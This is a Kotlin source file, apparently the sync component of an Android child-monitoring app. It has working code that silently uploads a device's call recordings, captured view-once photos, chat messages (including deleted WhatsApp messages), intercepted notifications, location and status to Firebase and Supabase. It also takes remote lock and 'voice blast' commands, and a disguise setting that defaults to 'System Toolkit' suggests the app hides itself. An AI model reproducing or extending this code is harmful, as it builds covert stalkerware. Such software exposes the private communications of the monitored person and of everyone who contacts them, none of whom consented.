package com.vyra.kids.core

import android.content.Context
import android.net.Uri
import android.util.Log
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.google.firebase.storage.FirebaseStorage
import java.io.File

class FirebaseSyncManager private constructor(private val context: Context) {

    private val firestore: FirebaseFirestore by lazy { FirebaseFirestore.getInstance() }
    private val storage: FirebaseStorage by lazy { FirebaseStorage.getInstance() }

    private val childId: String
        get() = PrefsManager.getInstance(context).pairingCode.ifEmpty { "child_1" }

    companion object {
        @Volatile
        private var instance: FirebaseSyncManager? = null

        fun getInstance(context: Context): FirebaseSyncManager {
            return instance ?: synchronized(this) {
                instance ?: FirebaseSyncManager(context.applicationContext).also { instance = it }
            }
        }
    }

    /**
     * Updates live device telemetry (battery, online status, disguise profile, location)
     */
    fun syncDeviceStatus(
        batteryLevel: Int? = null,
        isOnline: Boolean = true,
        disguise: String = "System Toolkit",
        location: String = "Live GPS Active",
        isScreenOn: Boolean? = null
    ) {
        try {
            val dynamicModel = "${android.os.Build.MANUFACTURER.replaceFirstChar { it.uppercase() }} ${android.os.Build.MODEL}"
            val realBattery = batteryLevel ?: run {
                val bm = context.getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
                val cap = bm?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
                if (cap in 1..100) {
                    cap
                } else {
                    val batteryIntent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                    val level = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
                    val scale = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
                    if (level >= 0 && scale > 0) ((level * 100) / scale) else 50
                }
            }
            val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
            val screenInteractive = isScreenOn ?: (pm?.isInteractive ?: true)

            val statusData = hashMapOf(
                "id" to childId,
                "deviceModel" to dynamicModel,
                "batteryLevel" to realBattery,
                "isOnline" to isOnline,
                "isScreenOn" to screenInteractive,
                "selectedDisguise" to disguise,
                "locationAddress" to location,
                "lastSeen" to FieldValue.serverTimestamp()
            )

            val localData = hashMapOf<String, Any>(
                "id" to childId,
                "deviceModel" to dynamicModel,
                "batteryLevel" to realBattery,
                "isOnline" to isOnline,
                "isScreenOn" to screenInteractive,
                "selectedDisguise" to disguise,
                "locationAddress" to location,
                "lastSeenMs" to System.currentTimeMillis()
            )
            LocalDataManager.getInstance(context).saveStatus(localData)
            SupabaseSyncManager.getInstance(context).syncRecord("devices", localData)

            firestore.collection("devices")
                .document(childId)
                .set(statusData, SetOptions.merge())
                .addOnSuccessListener {
                    Log.d(AppConstants.TAG, "Firestore: Device status synced successfully")
                    ScreenTimeManager.syncScreenTimeToFirebase(context)
                }
                .addOnFailureListener { e ->
                    Log.e(AppConstants.TAG, "Firestore: Failed to sync device status", e)
                }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in syncDeviceStatus", e)
        }
    }

    /**
     * Uploads call recording audio to Firebase Storage and records metadata in Firestore
     */
    fun syncCallRecord(
        callId: String,
        contactName: String,
        phoneNumber: String,
        callType: String,
        durationSeconds: Long,
        audioFile: File?,
        isTamperAttemptDetected: Boolean = false,
        callDateMs: Long? = null,
        onComplete: ((Boolean) -> Unit)? = null
    ) {
        try {
            if (audioFile != null && audioFile.exists()) {
                val storageRef = storage.reference.child("recordings/$childId/${audioFile.name}")
                val uploadTask = storageRef.putFile(Uri.fromFile(audioFile))

                uploadTask.addOnSuccessListener {
                    storageRef.downloadUrl.addOnSuccessListener { downloadUri ->
                        saveCallDoc(
                            callId, contactName, phoneNumber, callType,
                            durationSeconds, downloadUri.toString(), isTamperAttemptDetected, callDateMs, onComplete
                        )
                    }.addOnFailureListener {
                        saveCallDoc(
                            callId, contactName, phoneNumber, callType,
                            durationSeconds, audioFile.name, isTamperAttemptDetected, callDateMs, onComplete
                        )
                    }
                }.addOnFailureListener { e ->
                    Log.e(AppConstants.TAG, "Storage upload failed for ${audioFile.name}", e)
                    // Fallback to storing metadata with local file name
                    saveCallDoc(
                        callId, contactName, phoneNumber, callType,
                        durationSeconds, audioFile.name, isTamperAttemptDetected, callDateMs, onComplete
                    )
                }
            } else {
                saveCallDoc(
                    callId, contactName, phoneNumber, callType,
                    durationSeconds, "", isTamperAttemptDetected, callDateMs, onComplete
                )
            }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in syncCallRecord", e)
            onComplete?.invoke(false)
        }
    }

    private fun saveCallDoc(
        callId: String,
        contactName: String,
        phoneNumber: String,
        callType: String,
        durationSeconds: Long,
        recordingUrl: String,
        isTamperAttemptDetected: Boolean,
        callDateMs: Long? = null,
        onComplete: ((Boolean) -> Unit)?
    ) {
        val timestampVal = if (callDateMs != null && callDateMs > 0) {
            com.google.firebase.Timestamp(java.util.Date(callDateMs))
        } else {
            FieldValue.serverTimestamp()
        }

        val callData = hashMapOf(
            "id" to callId,
            "contactName" to contactName,
            "phoneNumber" to phoneNumber,
            "callType" to callType,
            "durationSeconds" to durationSeconds,
            "recordingUrl" to recordingUrl,
            "isTamperAttemptDetected" to isTamperAttemptDetected,
            "timestamp" to timestampVal
        )

        val localCall = hashMapOf<String, Any>(
            "id" to callId,
            "contactName" to contactName,
            "phoneNumber" to phoneNumber,
            "callType" to callType,
            "durationSeconds" to durationSeconds,
            "recordingUrl" to recordingUrl,
            "isTamperAttemptDetected" to isTamperAttemptDetected,
            "timestampMs" to (callDateMs ?: System.currentTimeMillis())
        )
        LocalDataManager.getInstance(context).saveCall(localCall)
        SupabaseSyncManager.getInstance(context).syncRecord("calls", localCall)

        firestore.collection("calls")
            .document(childId)
            .collection("records")
            .document(callId)
            .set(callData, SetOptions.merge())
            .addOnSuccessListener {
                Log.d(AppConstants.TAG, "Firestore: Call record $callId synced")
                onComplete?.invoke(true)
            }
            .addOnFailureListener { e ->
                Log.e(AppConstants.TAG, "Firestore: Failed to sync call record", e)
                onComplete?.invoke(false)
            }
    }

    /**
     * Uploads captured 1-view snaps or social photos directly to Firebase Storage
     * and creates a rich message doc with mediaUrl and ML Kit OCR text for parent app.
     */
    fun uploadMediaAndSyncChatMessage(
        msgId: String,
        app: String,
        sender: String,
        text: String,
        mediaFile: File,
        mediaType: String = "snap",
        isViewOnce: Boolean = true,
        isIncoming: Boolean = true,
        isDeletedBySender: Boolean = false,
        isWatchlistTarget: Boolean = false,
        ocrText: String? = null
    ) {
        try {
            if (!mediaFile.exists() || mediaFile.length() == 0L) {
                syncChatMessage(msgId, app, sender, text, isDeletedBySender, isWatchlistTarget)
                return
            }

            val storageRef = storage.reference.child("snaps/$childId/${mediaFile.name}")
            val uploadTask = storageRef.putFile(Uri.fromFile(mediaFile))

            uploadTask.addOnSuccessListener {
                storageRef.downloadUrl.addOnSuccessListener { downloadUri ->
                    val fullText = if (!ocrText.isNullOrBlank()) {
                        "$text\n📝 [Snap Text]: \"$ocrText\""
                    } else {
                        text
                    }
                    val msgData = hashMapOf(
                        "id" to msgId,
                        "app" to app,
                        "sender" to sender,
                        "text" to fullText,
                        "mediaUrl" to downloadUri.toString(),
                        "mediaType" to mediaType,
                        "isViewOnce" to isViewOnce,
                        "isIncoming" to isIncoming,
                        "isDeletedBySender" to isDeletedBySender,
                        "isWatchlistTarget" to isWatchlistTarget,
                        "timestamp" to FieldValue.serverTimestamp()
                    )
                    firestore.collection("chats")
                        .document(childId)
                        .collection("messages")
                        .document(msgId)
                        .set(msgData, SetOptions.merge())
                        .addOnSuccessListener {
                            Log.i(AppConstants.TAG, "Firestore: Snap media synced successfully ($msgId)")
                        }
                }.addOnFailureListener {
                    syncChatMessage(msgId, app, sender, text, isDeletedBySender, isWatchlistTarget)
                }
            }.addOnFailureListener { e ->
                Log.e(AppConstants.TAG, "Storage: Snap upload failed, falling back to text only", e)
                syncChatMessage(msgId, app, sender, text, isDeletedBySender, isWatchlistTarget)
            }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in uploadMediaAndSyncChatMessage", e)
            syncChatMessage(msgId, app, sender, text, isDeletedBySender, isWatchlistTarget)
        }
    }

    /**
     * Syncs captured social chat messages (including WhatsApp deleted-for-everyone messages)
     */
    fun syncChatMessage(
        msgId: String,
        app: String,
        sender: String,
        text: String,
        isDeletedBySender: Boolean = false,
        isWatchlistTarget: Boolean = false
    ) {
        try {
            val msgData = hashMapOf(
                "id" to msgId,
                "app" to app,
                "sender" to sender,
                "text" to text,
                "isDeletedBySender" to isDeletedBySender,
                "isWatchlistTarget" to isWatchlistTarget,
                "timestamp" to FieldValue.serverTimestamp()
            )

            val localChat = hashMapOf<String, Any>(
                "id" to msgId,
                "app" to app,
                "sender" to sender,
                "text" to text,
                "isDeletedBySender" to isDeletedBySender,
                "isWatchlistTarget" to isWatchlistTarget,
                "timestampMs" to System.currentTimeMillis()
            )
            LocalDataManager.getInstance(context).saveChat(localChat)
            SupabaseSyncManager.getInstance(context).syncRecord("chats", localChat)

            firestore.collection("chats")
                .document(childId)
                .collection("messages")
                .document(msgId)
                .set(msgData, SetOptions.merge())
                .addOnSuccessListener {
                    Log.d(AppConstants.TAG, "Firestore: Chat message synced ($app)")
                }
                .addOnFailureListener { e ->
                    Log.e(AppConstants.TAG, "Firestore: Failed to sync chat message", e)
                }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in syncChatMessage", e)
        }
    }

    /**
     * Syncs intercepted notification
     */
    fun syncNotification(
        itemId: String,
        packageName: String,
        appName: String,
        title: String,
        text: String,
        isImportant: Boolean = false
    ) {
        try {
            val itemData = hashMapOf(
                "id" to itemId,
                "packageName" to packageName,
                "appName" to appName,
                "title" to title,
                "text" to text,
                "isImportant" to isImportant,
                "timestamp" to FieldValue.serverTimestamp()
            )

            val localNotif = hashMapOf<String, Any>(
                "id" to itemId,
                "packageName" to packageName,
                "appName" to appName,
                "title" to title,
                "text" to text,
                "isImportant" to isImportant,
                "timestampMs" to System.currentTimeMillis()
            )
            LocalDataManager.getInstance(context).saveNotification(localNotif)
            SupabaseSyncManager.getInstance(context).syncRecord("notifications", localNotif)

            firestore.collection("notifications")
                .document(childId)
                .collection("items")
                .document(itemId)
                .set(itemData, SetOptions.merge())
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in syncNotification", e)
        }
    }

    /**
     * Listens for real-time remote commands sent by Parent (Voice blast, Phone lock, Disguise change)
     */
    fun startListeningToCommands(onCommandReceived: (action: String, payload: Map<String, Any>) -> Unit) {
        try {
            firestore.collection("devices")
                .document(childId)
                .collection("commands")
                .whereEqualTo("status", "PENDING")
                .addSnapshotListener { snapshots, e ->
                    if (e != null) {
                        Log.e(AppConstants.TAG, "Listen failed for commands", e)
                        return@addSnapshotListener
                    }

                    if (snapshots != null && !snapshots.isEmpty) {
                        for (doc in snapshots.documents) {
                            val action = doc.getString("action") ?: continue
                            @Suppress("UNCHECKED_CAST")
                            val payload = doc.get("payload") as? Map<String, Any> ?: emptyMap()

                            // Mark as EXECUTED
                            doc.reference.update("status", "EXECUTED")

                            Log.d(AppConstants.TAG, "Received remote command: $action")
                            onCommandReceived(action, payload)
                        }
                    }
                }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error starting command listener", e)
        }
    }
}
